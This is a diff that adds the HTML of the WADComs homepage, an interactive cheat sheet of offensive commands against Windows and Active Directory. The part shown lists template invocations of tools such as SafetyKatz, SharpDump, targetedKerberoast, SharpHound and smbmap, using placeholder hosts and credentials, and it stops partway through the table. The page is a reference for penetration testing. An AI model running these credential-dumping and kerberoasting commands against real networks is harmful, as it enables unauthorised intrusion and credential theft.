@@ -1,0 +1,11052 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>
+            
+            WADComs
+        </title>
+        <link rel="icon" href="/assets/logo.png">
+        <link id="pagestyle" rel="stylesheet" href="/assets/style.css" type="text/css"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+        <script async defer src="https://buttons.github.io/buttons.js"></script>
+    </head>
+    <body>
+        <script type="text/javascript">
+            
+
+            document.addEventListener('DOMContentLoaded', function () {
+            var checkbox = document.querySelector('input[type="checkbox"]');
+            checkbox.addEventListener('change', function () {
+                if (checkbox.checked) {
+                    document.getElementById('pagestyle').setAttribute('href','/assets/styleDark.css');
+                    localStorage["style"] = "true";
+                
+                } else {
+                    document.getElementById('pagestyle').setAttribute('href','/assets/style.css');
+                    localStorage["style"] = "false";
+                }
+            });
+            });
+
+        </script>
+
+ 
+        <a href="https://github.com/WADComs/WADComs.github.io" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+        <h1>
+    
+    WADComs
+    <div class="github-buttons">
+        <a class="github-button" href="https://github.com/WADComs/WADComs.github.io" data-icon="octicon-star" data-show-count="true" aria-label="Star WADComs/WADComs.github.io on GitHub">Star</a>
+        <label class="switch">
+            <input type="checkbox">
+            <span class="slider round"></span>
+        </label>
+        <script type="text/javascript">        
+            if(localStorage["style"]=="true"){
+                document.getElementById('pagestyle').setAttribute('href','/assets/styleDark.css');
+                document.querySelector('input[type="checkbox"]').checked = true
+            }
+        </script>
+    </div>
+</h1>
+
+
+<p><img src="/assets/logo.png" alt="logo" class="logo" /></p>
+
+<p>WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.</p>
+
+<p>If you hate constantly looking up the right command to use against a Windows or Active Directory environment (like me), this project should help ease the pain a bit. Just select what information you currently have related to the Windows machine (passwords, usernames, services, etc.), and it will display a list of tools you can try against the machine, along with a template command for easy copy/pasting. See the full list of <a href="/items/">items</a> and <a href="/filters/">filters</a>.</p>
+
+<p>This project was created by <a href="https://twitter.com/JohnWoodman15">John Woodman</a> and was inspired by <a href="https://gtfobins.github.io/">GTFOBins</a> and <a href="https://lolbas-project.github.io/">LOLBAS</a>. I relied heavily on <a href="https://gtfobins.github.io/">GTFOBins’</a> site template to make this one.</p>
+
+<p>I’m hoping to make WADComs a <a href="https://github.com/WADComs/WADComs.github.io">collaborative project</a>, so please feel free to <a href="/contribute/">contribute</a> your commands.</p>
+
+<style>
+.selected {
+	color: #ff0000 !important;
+	border-color: #ff0000 !important;
+}
+</style>
+
+<div id="bin-search-wrapper">
+
+    <ul id="bin-search-filters" class="filter-list">
+	<h3>What you have:</h3>
+	
+	
+	
+	<li><input type="checkbox" id="Username" name="item_name" onclick="handleChange(this, &quot;Username&quot;);" /><label id="Username_label" for="Username" data-title="You've found username(s) and need to know what you can do with them.">Username</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Password" name="item_name" onclick="handleChange(this, &quot;Password&quot;);" /><label id="Password_label" for="Password" data-title="You've found password(s) and need to know what you can do with them.">Password</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="No Creds" name="item_name" onclick="handleChange(this, &quot;No Creds&quot;);" /><label id="No Creds_label" for="No Creds" data-title="You don't have any usernames or passwords and need to know what you can still do.">No Creds</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Hash" name="item_name" onclick="handleChange(this, &quot;Hash&quot;);" /><label id="Hash_label" for="Hash" data-title="You've found hash(es) and need to know what you can do with them.">Hash</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="TGS" name="item_name" onclick="handleChange(this, &quot;TGS&quot;);" /><label id="TGS_label" for="TGS" data-title="You've found a user's Ticket Granting Service and need to know what you can do with it.">TGS</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="TGT" name="item_name" onclick="handleChange(this, &quot;TGT&quot;);" /><label id="TGT_label" for="TGT" data-title="You've found a user's or computer Ticket Granting Ticket and need to know what you can do with it.">TGT</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="PFX" name="item_name" onclick="handleChange(this, &quot;PFX&quot;);" /><label id="PFX_label" for="PFX" data-title="You've found a computer PFX file, which is in a PKCS#12 format, and need to know what you can do with it.">PFX</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Shell" name="item_name" onclick="handleChange(this, &quot;Shell&quot;);" /><label id="Shell_label" for="Shell" data-title="You have a shell on the Windows host and need to know what you can do.">Shell</label></li>
+	
+    </ul>
+    <ul id="bin-search-filters" class="filter-list">
+	<h3>Services:</h3>
+        
+        
+        
+	<li><input type="checkbox" id="SMB" name="service_name" onclick="handleChange(this, &quot;SMB&quot;);" /><label id="SMB_label" for="SMB" data-title="You've found the SMB service open  and need to know what you can do with it.">SMB</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="WMI" name="service_name" onclick="handleChange(this, &quot;WMI&quot;);" /><label id="WMI_label" for="WMI" data-title="You've found the Windows Management Intstrumentation (WMI) service open and need to know what you can do with it.">WMI</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="DCOM" name="service_name" onclick="handleChange(this, &quot;DCOM&quot;);" /><label id="DCOM_label" for="DCOM" data-title="You've found the DCOM service open and need to know what you can do with it.">DCOM</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="Kerberos" name="service_name" onclick="handleChange(this, &quot;Kerberos&quot;);" /><label id="Kerberos_label" for="Kerberos" data-title="You've found the kerberos service open and need to know what you can do with it.">Kerberos</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="RPC" name="service_name" onclick="handleChange(this, &quot;RPC&quot;);" /><label id="RPC_label" for="RPC" data-title="You've found the RPC service open and need to know what you can do with it.">RPC</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="LDAP" name="service_name" onclick="handleChange(this, &quot;LDAP&quot;);" /><label id="LDAP_label" for="LDAP" data-title="You've found the LDAP service open and need to know what you can do with it.">LDAP</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="NTLM" name="service_name" onclick="handleChange(this, &quot;NTLM&quot;);" /><label id="NTLM_label" for="NTLM" data-title="Command relates to the NTLM protocol.">NTLM</label></li>
+        
+        
+        
+	<li><input type="checkbox" id="DNS" name="service_name" onclick="handleChange(this, &quot;DNS&quot;);" /><label id="DNS_label" for="DNS" data-title="Command relates to the DNS service.">DNS</label></li>
+        
+    </ul>
+    <ul id="bin-search-filters" class="filter-list">
+	<h3>Attack Type:</h3>
+	
+	
+	
+	<li><input type="checkbox" id="Enumeration" name="attack_name" onclick="handleChange(this, &quot;Enumeration&quot;);" /><label id="Enumeration_label" for="Enumeration" data-title="Command focuses on enumeration.">Enumeration</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Exploitation" name="attack_name" onclick="handleChange(this, &quot;Exploitation&quot;);" /><label id="Exploitation_label" for="Exploitation" data-title="Command focuses on exploitation.">Exploitation</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Persistence" name="attack_name" onclick="handleChange(this, &quot;Persistence&quot;);" /><label id="Persistence_label" for="Persistence" data-title="Command focuses on persistence.">Persistence</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Privilege Escalation" name="attack_name" onclick="handleChange(this, &quot;Privilege Escalation&quot;);" /><label id="Privilege Escalation_label" for="Privilege Escalation" data-title="Command focuses on privilege escalation.">Privilege Escalation</label></li>
+	
+    </ul>
+    <ul id="bin-search-filters" class="filter-list">
+	<h3>OS:</h3>
+	
+	
+	
+	<li><input type="checkbox" id="Linux" name="OS_name" onclick="handleChange(this, &quot;Linux&quot;);" /><label id="Linux_label" for="Linux" data-title="Command can be run on Linux.">Linux</label></li>
+	
+	
+	
+	<li><input type="checkbox" id="Windows" name="OS_name" onclick="handleChange(this, &quot;Windows&quot;);" /><label id="Windows_label" for="Windows" data-title="Command can be run on Windows.">Windows</label></li>
+	
+    </ul>
+
+</div>
+<div style="margin-top: -20px;">
+<input id="bin-search" type="text" placeholder="Search among 91 commands: &lt;command&gt; +&lt;filter&gt; ..." />
+</div>
+
+<div id="bin-table-wrapper">
+    <table id="bin-table">
+        <thead>
+            <tr>
+                <th>Command</th>
+            </tr>
+        </thead>
+        <tbody>
+	     
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/winPEAS/" id="/wadcoms/winPEAS/" style="text-decoration: none; color: DarkGreen;">winpeas.exe cmd &gt; output.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/winPEAS/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/winPEAS/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/winPEAS/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/winPEAS/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/winPEAS/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/targetedKerberoast/" id="/wadcoms/targetedKerberoast/" style="text-decoration: none; color: DarkGreen;">python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/targetedKerberoast/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/targetedKerberoast/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/targetedKerberoast/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/targetedKerberoast/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/targetedKerberoast/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/targetedKerberoast/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/targetedKerberoast/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/targetedKerberoast/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Windapsearch/" id="/wadcoms/Windapsearch/" style="text-decoration: none; color: DarkGreen;">python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m &quot;Remote Desktop Users&quot; -C -r
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Windapsearch/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Windapsearch/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Windapsearch/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Windapsearch/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Windapsearch/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Windapsearch/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Windapsearch/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Snaffler/" id="/wadcoms/Snaffler/" style="text-decoration: none; color: DarkGreen;">Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Snaffler/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Snaffler/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Snaffler/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Snaffler/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Snaffler/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Snaffler/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SharpWMI/" id="/wadcoms/SharpWMI/" style="text-decoration: none; color: DarkGreen;">SharpWMI.exe action=query query=&quot;select * from win32_process&quot;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SharpWMI/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SharpWMI/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpWMI/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpWMI/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpWMI/#WMI">WMI</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpWMI/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SharpUp/" id="/wadcoms/SharpUp/" style="text-decoration: none; color: DarkGreen;">SharpUp.exe &gt; output.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SharpUp/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SharpUp/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpUp/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpUp/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpUp/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SharpLDAPmonitor/" id="/wadcoms/SharpLDAPmonitor/" style="text-decoration: none; color: DarkGreen;">SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:TEST.local\john /pass:password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SharpLDAPmonitor/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SharpLDAPmonitor/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpLDAPmonitor/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SharpHound/" id="/wadcoms/SharpHound/" style="text-decoration: none; color: DarkGreen;">SharpHound.exe --CollectionMethods All --ZipFileName output.zip
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SharpHound/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SharpHound/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SharpHound-LDAP/" id="/wadcoms/SharpHound-LDAP/" style="text-decoration: none; color: DarkGreen;">SharpHound.exe --CollectionMethod All --LdapUsername john --LdapPassword password123 --ZipFileName output.zip
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SharpHound-LDAP/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SharpHound-LDAP/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpHound-LDAP/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SharpDump/" id="/wadcoms/SharpDump/" style="text-decoration: none; color: DarkGreen;">SharpDump.exe
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SharpDump/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SharpDump/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpDump/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpDump/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpDump/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SharpDump/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Seatbelt/" id="/wadcoms/Seatbelt/" style="text-decoration: none; color: DarkGreen;">Seatbelt.exe -group=all -full &gt; output.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Seatbelt/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Seatbelt/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Seatbelt/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Seatbelt/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Seatbelt/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Seatbelt/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SafetyKatz/" id="/wadcoms/SafetyKatz/" style="text-decoration: none; color: DarkGreen;">SafetyKatz.exe
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SafetyKatz/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SafetyKatz/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SafetyKatz/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SafetyKatz/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SafetyKatz/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SafetyKatz/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBMap-Enum-Share/" id="/wadcoms/SMBMap-Enum-Share/" style="text-decoration: none; color: DarkGreen;">python3 smbmap.py --host-file smb-hosts.txt -u john -p &#39;password123&#39; -d test.local -L
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBMap-Enum-Share/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBMap-Enum-Share/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
